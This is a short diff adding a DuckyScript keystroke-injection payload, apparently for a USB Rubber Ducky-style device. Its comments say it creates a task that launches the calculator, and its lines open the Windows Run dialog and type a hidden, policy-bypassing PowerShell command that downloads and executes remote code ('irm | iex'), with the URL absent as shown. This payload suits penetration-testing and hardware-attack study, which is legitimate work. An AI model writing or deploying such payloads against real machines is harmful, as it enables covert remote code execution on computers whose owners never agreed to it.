@@ -1,0 +1,6 @@
+REM executes creation of task via PS
+GUI r
+DEFAULT_DELAY 300
+REM creates a task to launch calc, calc_task.ps1
+STRING powershell -NoP -Ep Bypass -W H -C irm  | iex
+ENTER
